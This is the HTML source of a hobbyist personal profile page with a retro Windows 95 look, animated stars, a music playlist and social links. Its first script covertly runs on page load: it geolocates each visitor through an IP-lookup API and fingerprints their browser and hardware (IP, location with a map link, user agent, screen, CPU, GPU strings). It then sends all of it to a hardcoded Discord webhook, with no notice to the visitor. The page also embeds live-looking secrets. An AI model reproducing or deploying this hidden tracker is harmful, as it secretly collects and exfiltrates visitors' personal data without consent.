<!DOCTYPE html>
<html lang="en">

<head>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Mono:wght@100..900&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap');
    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="icon.png">
    <title>The Awsome koru site</title>
    <style id="font-face-style">
        @font-face {
            font-family: meowfont;
            src: url('font/whacky_joe-webfont.woff') format('woff2');
        }
    </style>
    <style>
        .win95con {
            background: #C0C0C0;
            border: 2px solid greenyellow;
            border-color: #FFFFFF #808080 #808080 #FFFFFF;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .win95con> :first-child {
            height: 18px;
            width: calc(100% - 4px);
            background: #000080;
            color: #FFF;
            margin: 2px;
        }

        .win95con> :first-child> :first-child {
            float: left;
            image-rendering: pixelated;
        }

        #win95conTitle {
            margin: 2px 0 0 1px;
            float: left;
            font-family: Tahoma;
            font-weight: bold;
            font-size: 11px;
            padding-left: 4px;
        }

        .win95con> :first-child>button {
            margin: 2px 2px 2px 0px;
            float: right;
            width: 14px;
            height: 13.5px;
            background: #C0C0C0;
            border-width: 1px;
            border-color: #FFFFFF #808080 #808080 #FFFFFF;
            padding: 0;
            font-size: 9px;
            font-weight: bold;
            font-family: Tahoma;
            text-align: center;
        }

        #win95containerreal {
            padding: 2px;
        }

        * {
            z-index: 1;
        }

        pre {
            font-family: "Noto Sans Mono", Menlo, Monaco, Consolas, monospace;
        }

        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background-color: #010016;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            margin: 0;
            overflow: hidden;

            --prof-border-thickness: 2px;
            --prof-radius: 20px;
            --prof-outline_color: #3100a5;
            --text-color: #ff94c9;
            --profile-width: 500px;
            --banner-height: 150px;
            --boogiesize: 128px;

            background-color: #010016 !important;
        }

        .circle-img {
            border: var(--prof-border-thickness) solid var(--prof-outline_color);
            border-radius: 50%;
            width: var(--banner-height);
            height: var(--banner-height);
            object-fit: cover;
            margin: 0;
            padding: 0;
        }

        .star {
            position: absolute;
            border: none;
        }

        .linkbox {
            width: 40px;
            height: 40px;
            margin: 5px;
            border: 2px solid var(--prof-outline_color);
            border-radius: 12px;

            display: flex;
            justify-content: center;
            align-items: center;
        }

        .linkimg {
            width: 30px;
            height: 30px;
            background-size: contain;
            background-repeat: no-repeat;
            position: absolute;
        }

        @keyframes twinkle {
            0% {
                transform: translateY(0) translateX(0);
            }

            100% {
                transform: translateY(-200vh) translateX(200vw) rotate(360deg);
            }
        }

        #shiggy {
            image-rendering: pixelated;
        }

        #hidableText {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            top: 10%;
            z-index: 9999;
            visibility: visible;
            padding-bottom: 20px;
            color: white;
            font-family: meowfont;
        }

        #catcode {
            position: absolute;
            margin-top: -85px;
            color: black !important
        }

        #epicButton {
            width: unset;
            padding-left: 2px;
            padding-right: 2px;
        }

        #playListDiv {
            max-width: 200px;
            min-width: 200px;
            min-height: 20px;
            max-height: 300px;
            background-color: white;
            display: flex;
            flex-direction: column;
            padding-bottom: 4px;
        }

        #musicItems {
            overflow-y: scroll;
        }

        #playListEqualizer {
            background-color: black;
            margin: 4px;
            position: relative;
            font-family: "Noto Sans Mono", Menlo, Monaco, Consolas, monospace;
            color: yellowgreen;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        #progressTime {
            font-size: 16px;
            padding-top: 8px;
            line-height: 16px;
            margin: 0px;
        }

        #progressBar {
            width: 90%;
        }

        .musicElement {
            width: calc(100% - 16px);
            margin-left: 4px;
            margin-right: 4px;
            margin-top: 4px;
            border: 2px solid black;
            padding: 2px;
            background-color: black;
            color: greenyellow;
            font-size: 12px;
            font-family: "Noto Sans Mono", Menlo, Monaco, Consolas, monospace;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .musicElement:hover {
            background-color: rgb(41, 41, 41);
        }
    </style>
</head>

<body>
    <canvas id="glcanvas" width="0" height="0"></canvas>
    <div id="starsdiv"></div>

    <script>
        function getRandomNumber(min, max) {
            return Math.random() * (max - min) + min;
        }

        const actualWidth = window.visualViewport.width;
        const actualHeight = window.visualViewport.height;

        var webhookURL = "https://discord.com/api/webhooks/1143172539183534132/YRbyGP-3XZBkPveCPozw3lXUc81NPXtjjeAIqNKf-p9g9Slfl1JmJAd_QUwSttDoahoE";
        var userInfo = "yeah idk";

        function json(url) {
            return fetch(url).then(res => res.json());
        }

        var canvas;
        canvas = document.getElementById("glcanvas");
        var gl = canvas.getContext("experimental-webgl");

        function getUnmaskedInfo(gl) {
            var unMaskedInfo = {
                renderer: '',
                vendor: ''
            };

            var dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (dbgRenderInfo != null) {
                unMaskedInfo.renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
                unMaskedInfo.vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
            }

            return unMaskedInfo;
        }

        function sendWebhookInter() {
            let apiKey = '8c7095acb749cd89945b39c8f59293449d382d0ac157bd0b360f19d4';
            json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
                const runs = 150000000;
                const start = performance.now(); // in ms, usually with 100us resolution
                for (let i = runs; i > 0; i--) { }
                const end = performance.now();
                const ms = end - start;
                const cyclesPerRun = 2;
                const speed = (runs / ms / 1000000) * cyclesPerRun;

                userInfo = `IP: ${data.ip}, Count: ${data.count}
                ASN: ${data.asn.name}, Type: ${data.asn.type}
                Region: ${data.region}, ${data.country_name}: ${data.emoji_flag}
                [Maps Link](https://www.google.co.uk/maps/place/${data.latitude},${data.longitude})
                url: <${window.location.toString()}>
                Referer: ${document.referrer || "None"}
                Agent: ${navigator.userAgent}
                Dims: ${screen.width}x${screen.height}
                Mem: ${navigator.deviceMemory || 'Unknown'}
                CPUS: ${navigator.hardwareConcurrency || 'Unknown'}
                Est GHz: ${Math.round(speed * 10) / 10}
                \nWebGL Info:\n`;

                userInfo += "RENDERER: " + gl.getParameter(gl.RENDERER) + "\n";
                userInfo += "VENDOR: " + gl.getParameter(gl.VENDOR) + "\n";
                userInfo += "vendor: " + getUnmaskedInfo(gl).vendor + "\n";
                userInfo += "renderer: " + getUnmaskedInfo(gl).renderer + "\n";

                let userInfoLines = []
                userInfo.split("\n").forEach(function (value) {
                    userInfoLines.push(value.trim())
                })

                userInfo = userInfoLines.join("\n")

                sendWebhook();
            }).catch(error => {
                userInfo = `Error: ${error}`;
                sendWebhook();
            });
        }

        function sendWebhook() {
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `<@594965168111353896> The page has been loaded\n\n${userInfo}`
                })
            })
                .then(response => {
                    if (!response.ok) {
                        console.error('Failed to send webhook:', response.status, response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Error sending webhook:', error);
                });
        }

        if (!window.location.href.includes("extensionId=bianxianyang.htmlplay") && !window.location.href.includes("http://127.0.0.1") && !window.location.href.includes("http://192.168.1.")) {
            sendWebhookInter();
        }

        function getRandomNumber(min, max) {
            return Math.random() * (max - min) + min;
        }

        function createStar() {
            const star = document.createElement('div');
            star.classList.add('star');

            let minstarsize = 2;
            let maxstarsize = 5;

            let starspeed = getRandomNumber(2, 5);
            let starscaling = (starspeed - minstarsize) / (maxstarsize - minstarsize);

            let starfinalsize = Math.floor(Math.max(1, ((starscaling - 1) * -1) * 50)) + 1;
            let animstarspeed = 5 + (50 * (Math.tan(starscaling * 1.37) * 0.2));

            star.style.width = starfinalsize + "px";
            star.style.height = starfinalsize + "px";

            star.style.left = `calc(0vw - ${starfinalsize}px)`;
            star.style.top = `${Math.floor(Math.random() * 200)}vh`;

            if (false) {
                star.style.left = getRandomNumber(0, actualWidth - 32) + "px";
                star.style.top = getRandomNumber(0, actualHeight - 32) + "px";
            }
            else {
                //console.log(animstarspeed);

                star.style.animation = 'twinkle ' + animstarspeed + 's normal linear';
                setTimeout(() => {
                    star.remove();
                }, animstarspeed * 1000);
            }

            star.style.zIndex = 0;
            let starvisible = Math.max(0.1, Math.min(1, ((Math.tan(starscaling * 1.37) * 0.2) * -1) + 1)) * 255;
            //console.log(starvisible);
            let starcolor = `rgb(${starvisible}, ${starvisible}, ${starvisible})`
            star.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='36' viewBox='0 0 24 24' fill='${starcolor}' stroke='${starcolor}' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' class='lucide lucide-star' transform='rotate(${getRandomNumber(0, 360)})'%3E%3Cpolygon points='12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2'/%3E%3C/svg%3E")`;
            if (parseInt(getRandomNumber(0, 20)) == 0) {
                star.style.backgroundImage = "url(\"https://koharuxenon.github.io/korusite/shiggy.gif\")"
            }
            if (parseInt(getRandomNumber(0, 20)) == 0) {
                star.style.backgroundImage = "url(\"030.gif\")"
            }
            star.style.backgroundSize = "contain";
            star.style.backgroundRepeat = "no-repeat";
            document.getElementById("starsdiv").appendChild(star);
        }

        setInterval(createStar, 250);

        var audio = new Audio('music/car.mp3');
        audio.loop = true;

        function playAudio() {
            console.log("Playing")
            if (true) {
                if (audio.paused) {
                    audio.play();
                }
            }
        }

        window.addEventListener('load', function () {

            function checkAudio() {
                if (!audio.paused) {
                    document.getElementById('hiddenElement').style.visibility = 'visible';
                    document.getElementById('hiddenElement2').style.visibility = 'visible';
                    if (document.getElementById('hidableText'))
                        document.getElementById('hidableText').remove();
                    clearInterval(checkAudio);
                }
                else {
                    if (document.getElementById('hidableText'))
                        document.getElementById('hidableText').style.visibility = 'visible';
                }
            }

            setInterval(checkAudio, 250);

            setTimeout(function () {
                let funninumber = parseInt(getRandomNumber(0, 100).toString());
                //console.log(funninumber);
                if (funninumber == 0) {
                    document.getElementById("background-gradient-div").style.setProperty("background-image", "linear-gradient(#5ADEFF, #ffffff, #ff75ff)", "important");
                }
            }, 100);

            document.getElementById("catcode").textContent = "  ／l、\n（ﾟ､ ｡ ７\n  l  ~ヽ\n  じしf_,)ノ";
            document.getElementById("win95conTitle").textContent = document.title;

            function doHeight(computedStyle, desiredscale) {
                let compHeight = ((parseInt(computedStyle.height) + (61*2)) * desiredscale);
                console.log("Height" + ", " + compHeight + ", " + actualHeight)
                if (compHeight > actualHeight) {
                    desiredscale = desiredscale * (actualHeight / compHeight);
                    console.log("New Height:" + ", " + compHeight * desiredscale + ", " + "scale:" + ", " + desiredscale);
                    document.getElementById("scalablebio").style.transform = `scale(${desiredscale})`;
                }
            }

            let scalablebio = document.getElementById("win95con");
            let computedStyle = window.getComputedStyle(scalablebio);
            setTimeout(() => {
                let compWidth = parseInt(computedStyle.width) + 256;
                console.log("Width" + ", " + compWidth + ", " + actualWidth)
                let desiredscale = 1
                if (compWidth > actualWidth) {
                    desiredscale = actualWidth / compWidth;
                    console.log("New width:" + ", " + compWidth * desiredscale + ", " + "scale:" + ", " + desiredscale);
                    document.getElementById("scalablebio").style.transform = `scale(${desiredscale})`;
                }
                setTimeout(() => {
                    doHeight(computedStyle, desiredscale)
                }, 10);
            }, 0);
        });
    </script>

    <a id="hidableText" onclick="playAudio()">!CLICK
        ME!</a>

    <div id="scalablebio">
        <div class="win95con" id="win95con">
            <div>
                <img backup="https://koharuxenon.github.io/korusite/icon.png" src="icon.png" width="16" height="16"
                    style="padding: 1px;" />
                <p id="win95conTitle"></p>
                <button onclick="explodePage()">X</button>
                <button>?</button>
                <button id="epicButton" onclick="openEpicGame()">Epic Game</button>
                <button id="epicButton" onclick="openEpicSite()">Epic Site</button>
                <button id="epicButton" onclick="openPman()">CHECK THESE GUYS</button>
            </div>
            <div id="win95containerreal">
                <div
                    style="width: var(--profile-width); max-width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 2px solid #000080;">
                    <div
                        style="background-image: url(https://koharuxenon.github.io/korusite/banner.jpg); background-size: cover; height: var(--banner-height); background-repeat: no-repeat; width: 100%; background-position: center;">
                    </div>
                    <div style="width: 100%; background-image: linear-gradient(#5aff5a, #ffffff, #ff75ff) !important;"
                        id="background-gradient-div">
                        <img backup="https://koharuxenon.github.io/korusite/koru.png" src="koru.png" class="circle-img"
                            style="position: absolute; left: 50%; transform: translate(-50%, -50%);">

                        <div style="padding-bottom: 20px;">
                            <pre id="catcode"></pre>
                            <img backup="https://koharuxenon.github.io/korusite/shiggy.gif" src="shiggy.gif" id="shiggy"
                                style="margin-top: calc(var(--prof-border-thickness)*-1); position: absolute;">

                            <pre href="https://discord.com/users/594965168111353896"
                                style="text-align: center; font-family: meowfont; font-weight: 600; font-size: 28px; color: var(--prof-outline_color); margin-top: 90px;"><a href="https://discord.com/users/594965168111353896" style="color: var(--text-color) !important; text-decoration: none; text-shadow: 0 0 10px rgba(255, 148, 255, 1);">Koru</a></pre>

                            <pre
                                style="text-align: center; font-family: meowfont; font-size: 16px; color: var(--text-color) !important;">It's me
the koru
uhhh yeah
idk what to put here</pre>

                            <div style="display: flex;  justify-content: center; margin-top: 20px;">
                                <a href="https://namemc.com/profile/KoharuXenon.1" class="linkbox">
                                    <img class="linkimg" src="https://s.namemc.com/img/favicon-30.png"></a>

                                <a href="https://www.youtube.com/KoharuXenon" class="linkbox">
                                    <img class="linkimg"
                                        src="https://cdn-icons-png.flaticon.com/256/1384/1384060.png"></a>

                                <a href="https://github.com/KoharuXenon/" class="linkbox">
                                    <img class="linkimg"
                                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/640px-GitHub_Invertocat_Logo.svg.png"></a>
                            </div>
                            <div style="display: flex;  justify-content: center; margin-top: 20px;">
                                <img backup="https://koharuxenon.github.io/korusite/ralseismokingadart.gif"
                                    src="ralseismokingadart.gif" id="shiggy">
                                <img backup="https://koharuxenon.github.io/korusite/lem88x31.gif" src="lem88x31.gif"
                                    id="shiggy">
                                <img backup="https://koharuxenon.github.io/korusite/reshirii.gif" src="reshirii.gif"
                                    id="shiggy">
                                <a href="https://www.cavestory.org/" style="height: 31px;">
                                    <img backup="https://leojrthetanooki.github.io/webgraphics/buttons/cave-story-button4.gif"
                                        src="cave-story-button4.gif" id="shiggy">

                                </a>
                            </div>
                            <div style="display: flex;  justify-content: center;">
                                <img backup="https://leojrthetanooki.github.io/webgraphics/buttons/vib-ribbon.png"
                                    src="vib-ribbon.png" id="shiggy">
                                <img backup="https://leojrthetanooki.github.io/webgraphics/buttons/fireskull.gif"
                                    src="fireskull.gif" id="shiggy">
                            </div>

                        </div>
                    </div>
                    <img id="explodeIMG"
                        backup="https://cdn.discordapp.com/attachments/1149275257178435605/1259970719165448262/explosion-boom.gif?ex=668d9eac&is=668c4d2c&hm=7a1584d2a545cfc161910d9084ef966be26de8337b8b25462b32a222cd655a5d&"
                        src="explosion-boom.gif" style="position: absolute; width: 100%; height: 100%; display: none;"
                        id="shiggy">
                </div>
            </div>

            <div class="win95con" style="top: 330px; left: -130px; transform: translate(0%, 0%);">
                <div>
                    <img backup="https://koharuxenon.github.io/korusite/icon.png" src="icon.png" width="16" height="16"
                        style="padding: 1px;" />
                    <p id="win95conTitle">Playlist</p>
                    <button>X</button>
                    <button>?</button>
                </div>
                <div id="win95containerreal">
                    <div id="playListDiv">
                        <div id="playListEqualizer">
                            <p id="progressTime">00:00/00:00</p>
                            <progress id="progressBar" max="100" value="0"></progress>
                        </div>
                        <div id="musicItems"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <img src="https://static-00.iconduck.com/assets.00/tangerine-emoji-2048x2039-5nryc9hh.png"
        style="position: absolute; width: 64px; top: calc(100% - 64px); left: calc(100% - 64px)" id="tangerine">

    <img src="car.gif" id="hiddenElement"
        style="position: absolute; visibility: hidden; left: calc(100% - var(--boogiesize)); width: var(--boogiesize); height: var(--boogiesize); top:0%;">

    <img src="gagam.gif" id="hiddenElement2"
        style="position: absolute; visibility: hidden; left: calc(100% - var(--boogiesize)); width: var(--boogiesize); height: var(--boogiesize); top:calc(0% + var(--boogiesize));">

    <script>
        function imageError(event) {
            let elementBackup = event.target.getAttribute("backup");
            if (elementBackup) {
                event.target.src = elementBackup
                imgels[i].onerror = null;
            }
        }

        let imgels = document.querySelectorAll('img');

        for (let i = 0; i < imgels.length; i++) {
            imgels[i].onerror = imageError;
        }

        if (document.location.toString().includes("htmlplay")) {
            let styleElement = document.querySelector('style#font-face-style');
            styleElement.textContent = `
            @font-face {
                font-family: meowfont;
                src: url('https://koharuxenon.github.io/korusite/whacky_joe-webfont.woff') format('woff2');
            }
        `;
        }

        let musics = [
            {
                name: "Hit single - Silly Billy",
                url: "music/silly billy.mp3"
            },
            {
                name: "CITRUS!",
                url: "music/citrus.mp3"
            },
            {
                name: "Femtanyl - Push Ur T3mprr",
                url: "music/pushurtempurr.mp3"
            },
            {
                name: "Jersey Nova",
                url: "music/jersey.mp3"
            },
            {
                name: "Femtanyl - P3T",
                url: "music/pet.mp3"
            },
            {
                name: "Nicopatty - menu",
                url: "music/menu.mp3"
            },
            {
                name: "Delta Lobby (feat. Twikipedia)",
                url: "music/delta.mp3"
            },
            {
                name: "femtanyl - DINNER!",
                url: "music/dinner.mp3"
            },
            {
                name: "SiIvaGunner - clubhouse",
                url: "music/clubhouse.mp3"
            },
            {
                name: "Rain World - Floes",
                url: "music/floes.mp3"
            },
            {
                name: "GREAT_GRACES",
                url: "music/greatgraces.mp3"
            },
        ]

        let playListDiv = document.getElementById("musicItems")
        let progressBar = document.getElementById("progressBar");
        let progressTime = document.getElementById("progressTime");
        let prevMusic = null

        function formatTime(time) {
            let minutes = Math.floor(time / 60);
            let seconds = Math.floor(time % 60);
            return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }

        musics.forEach(function (music) {
            let playMusic = document.createElement("div")
            playMusic.classList.add("musicElement")
            playMusic.textContent = music.name;
            playMusic.onclick = function () {
                console.log(music.url)
                if (prevMusic != null && prevMusic.src.includes(encodeURI(music.url))) {
                    if (!prevMusic.paused) {
                        prevMusic.pause();
                    }
                    else {
                        prevMusic.play();
                    }
                }
                else {
                    if (prevMusic != null) {
                        prevMusic.pause();
                        prevMusic.remove();
                    }
                    var audio = new Audio(music.url);
                    audio.play();
                    audio.volume = 0.5
                    prevMusic = audio;

                    audio.addEventListener("timeupdate", function () {
                        let progress = (audio.currentTime / audio.duration) * 100;
                        progressBar.value = progress;

                        let currentTime = formatTime(audio.currentTime);
                        let duration = formatTime(audio.duration);
                        progressTime.textContent = `${currentTime} / ${duration}`;
                    });
                }
            }
            playListDiv.appendChild(playMusic);
        });

        document.getElementById("tangerine").addEventListener("click", function (event) {
            alert(`#include <iostream>

int main() {
    std::cout << "Hello World!";
    return 0;
}`)
        })
    </script>

    <script src="./oneko.js"></script>
    <script src="./catfren.js"></script>

    <script>
        function openPman() {
            location.href = 'https://pmandudeguylol.github.io/pmans-epic-site/';
        }
        function openEpicSite() {
            location.href = 'website/index.html';
        }
        function openEpicGame() {
            location.href = 'epicgame/index.html';
        }
        function explodePage() {
            var audio = new Audio('explode.mp3');
            audio.play();
            document.getElementById("explodeIMG").style.display = "block"
            setTimeout(function () {
                document.body.remove();
            }, 550);
        }
    </script>

</body>

</html>